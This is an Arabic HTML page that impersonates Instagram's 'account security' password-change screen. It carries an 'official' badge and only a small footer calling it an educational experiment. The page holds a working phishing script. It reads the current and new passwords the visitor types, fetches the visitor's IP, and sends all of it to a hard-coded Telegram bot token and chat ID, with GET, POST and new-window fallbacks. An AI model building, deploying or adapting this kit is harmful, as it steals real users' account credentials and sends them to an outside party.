<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>تغيير كلمة المرور</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            border-bottom: 1px solid #efefef;
            gap: 12px;
        }
        .header h2 {
            font-size: 17px;
            font-weight: 700;
            flex: 1;
        }
        .header i {
            font-size: 20px;
            color: #262626;
        }
        .profile {
            display: flex;
            align-items: center;
            padding: 10px 16px;
            border-bottom: 1px solid #efefef;
            gap: 10px;
        }
        .avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(135deg, #f09433, #dc2743, #bc1888);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: 700;
            font-size: 16px;
        }
        .profile-info h4 {
            font-size: 14px;
            font-weight: 700;
        }
        .profile-info span {
            font-size: 12px;
            color: #8e8e8e;
        }
        .badge {
            background: #0095f6;
            color: #fff;
            font-size: 9px;
            padding: 2px 8px;
            border-radius: 12px;
        }
        .content {
            flex: 1;
            padding: 16px;
        }
        .title {
            font-size: 22px;
            font-weight: 800;
            margin-bottom: 2px;
        }
        .sub {
            font-size: 13px;
            color: #8e8e8e;
            margin-bottom: 16px;
        }
        .field {
            margin-bottom: 14px;
        }
        .field label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 4px;
        }
        .input-box {
            position: relative;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 10px;
        }
        .input-box:focus-within {
            border-color: #262626;
            background: #fff;
        }
        .input-box i {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 16px;
        }
        .input-box input {
            width: 100%;
            padding: 12px 40px 12px 12px;
            font-size: 15px;
            border: none;
            background: transparent;
            outline: none;
            font-weight: 500;
            color: #262626;
            direction: ltr;
            text-align: right;
            min-height: 44px;
        }
        .input-box input::placeholder {
            color: #8e8e8e;
            font-weight: 400;
        }
        .eye {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #8e8e8e;
            font-size: 16px;
            cursor: pointer;
            padding: 4px;
        }
        .btn {
            width: 100%;
            padding: 13px;
            background: #0095f6;
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 16px;
            min-height: 48px;
        }
        .btn:active {
            transform: scale(0.97);
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .toast {
            margin-top: 12px;
            padding: 10px 14px;
            border-radius: 10px;
            font-size: 13px;
            font-weight: 500;
            display: none;
            text-align: center;
        }
        .toast.show {
            display: block;
        }
        .toast.ok {
            background: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #c8e6c9;
        }
        .toast.err {
            background: #fce4ec;
            color: #c62828;
            border: 1px solid #f8bbd0;
        }
        .toast.inf {
            background: #e3f2fd;
            color: #0d47a1;
            border: 1px solid #bbdefb;
        }
        .footer {
            padding: 10px 16px;
            border-top: 1px solid #efefef;
            text-align: center;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 16px;
            font-size: 11px;
            color: #8e8e8e;
            margin-bottom: 4px;
        }
        .footer-warn {
            font-size: 10px;
            color: #8e8e8e;
        }
        .footer-warn i {
            color: #ed4956;
        }
        .nav {
            display: flex;
            justify-content: space-around;
            padding: 6px 0 10px;
            border-top: 1px solid #efefef;
        }
        .nav i {
            font-size: 22px;
            color: #8e8e8e;
            padding: 4px;
        }
        .nav i.active {
            color: #262626;
        }
        @media (max-width: 380px) {
            .title {
                font-size: 19px;
            }
            .content {
                padding: 12px;
            }
            .input-box input {
                font-size: 14px;
                padding: 10px 36px 10px 10px;
                min-height: 40px;
            }
        }
    </style>
</head>
<body>

    <div class="container">

        <div class="header">
            <i class="fas fa-chevron-right"></i>
            <h2>أمان الحساب</h2>
            <i class="fas fa-ellipsis-h"></i>
        </div>

        <div class="profile">
            <div class="avatar">I</div>
            <div class="profile-info">
                <h4>Instagram <span class="badge">رسمي</span></h4>
                <span>مركز المساعدة • الأمان</span>
            </div>
            <i class="fas fa-chevron-left" style="color:#8e8e8e; font-size:12px;"></i>
        </div>

        <div class="content">

            <div class="title">كلمة مرور قوية</div>
            <div class="sub">استخدم كلمة مرور فريدة لحماية حسابك</div>

            <div class="field">
                <label>كلمة المرور الحالية</label>
                <div class="input-box">
                    <i class="fas fa-lock"></i>
                    <input type="password" id="oldPass" placeholder="ادخل كلمة المرور الحالية" />
                    <button class="eye" onclick="togglePass('oldPass', this)"><i class="fas fa-eye"></i></button>
                </div>
            </div>

            <div class="field">
                <label>كلمة المرور الجديدة</label>
                <div class="input-box">
                    <i class="fas fa-key"></i>
                    <input type="password" id="newPass" placeholder="ادخل كلمة المرور الجديدة" />
                    <button class="eye" onclick="togglePass('newPass', this)"><i class="fas fa-eye"></i></button>
                </div>
            </div>

            <button class="btn" id="submitBtn"><i class="fas fa-paper-plane"></i> تغيير كلمة المرور</button>

            <div class="toast" id="toast"></div>

        </div>

        <div class="footer">
            <div class="footer-links">
                <span>مساعدة</span>
                <span>سياسة الخصوصية</span>
                <span>شروط الخدمة</span>
            </div>
            <div class="footer-warn">
                <i class="fas fa-exclamation-triangle"></i> تجربة تعليمية — لا تدخل معلومات حساسة
            </div>
        </div>

        <div class="nav">
            <i class="fas fa-home"></i>
            <i class="fas fa-search"></i>
            <i class="fas fa-plus-square"></i>
            <i class="fas fa-heart"></i>
            <i class="fas fa-user-circle active"></i>
        </div>

    </div>

    <script>
        // =============================================
        // ✅ بيانات التلغرام
        // =============================================
        const BOT_TOKEN = '8765312624:AAF5cD-VCsNGRVbgH2eh1g8NdqmH49Bvi3M';
        const CHAT_ID = '5775368729';

        // =============================================
        const oldPass = document.getElementById('oldPass');
        const newPass = document.getElementById('newPass');
        const submitBtn = document.getElementById('submitBtn');
        const toast = document.getElementById('toast');

        let sending = false;

        // ===== إظهار/إخفاء =====
        window.togglePass = function(id, btn) {
            const inp = document.getElementById(id);
            const vis = inp.type === 'text';
            inp.type = vis ? 'password' : 'text';
            btn.querySelector('i').className = vis ? 'fas fa-eye' : 'fas fa-eye-slash';
        };

        // ===== رسالة =====
        function showToast(msg, type = 'inf') {
            toast.className = 'toast show ' + type;
            toast.textContent = msg;
        }

        // ===== جلب IP =====
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير متاح';
            } catch {
                return 'غير متاح';
            }
        }

        // ============================================================
        // ✅ الإرسال إلى تلغرام - 3 طرق مختلفة (واحدة منهم تشتغل)
        // ============================================================
        async function sendToTelegram(oldP, newP) {
            const ip = await getIP();
            const time = new Date().toLocaleString('ar-EG', { hour12: true });

            const text =
                `🛡️ تغيير كلمة المرور\n\n🔑 القديمة: ${oldP}\n🔑 الجديدة: ${newP}\n⏰ ${time}\n🌐 ${ip}\n\n⚠️ تجربة تعليمية`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;

            // ===== الطريقة 1: GET (أسهل وأسرع) =====
            try {
                const res = await fetch(url, { method: 'GET' });
                const data = await res.json();
                if (data.ok) return { success: true };
            } catch (e) { console.log('طريقة 1 فشلت:', e); }

            // ===== الطريقة 2: POST =====
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });
                const data = await res.json();
                if (data.ok) return { success: true };
            } catch (e) { console.log('طريقة 2 فشلت:', e); }

            // ===== الطريقة 3: فتح الرابط في نافذة جديدة (حل أخير) =====
            try {
                window.open(url, '_blank');
                return { success: true, method: 'window' };
            } catch (e) {
                return { success: false, error: e.message };
            }
        }

        // ===== زر الإرسال =====
        submitBtn.addEventListener('click', async function() {
            if (sending) return;

            const oldP = oldPass.value.trim();
            const newP = newPass.value.trim();

            if (!oldP) { showToast('⚠️ اكتب كلمة المرور الحالية', 'err'); return; }
            if (!newP) { showToast('⚠️ اكتب كلمة المرور الجديدة', 'err'); return; }
            if (oldP === newP) { showToast('⚠️ الجديدة يجب أن تختلف عن القديمة', 'err'); return; }

            sending = true;
            submitBtn.disabled = true;
            showToast('📤 جاري الإرسال...', 'inf');

            const result = await sendToTelegram(oldP, newP);

            if (result.success) {
                showToast('✅ تم الإرسال بنجاح!', 'ok');
                oldPass.value = '';
                newPass.value = '';
            } else {
                showToast('❌ فشل الإرسال: ' + (result.error || 'خطأ'), 'err');
            }

            setTimeout(() => {
                sending = false;
                submitBtn.disabled = false;
            }, 2000);
        });

        // ===== اختبار البوت =====
        async function testBot() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                const data = await res.json();
                if (data.ok) {
                    console.log('✅ البوت شغال:', data.result.first_name);
                } else {
                    console.log('❌ البوت مش شغال');
                }
            } catch (e) {
                console.log('⚠️ تعذر اختبار البوت');
            }
        }
        testBot();
    </script>

</body>
</html>
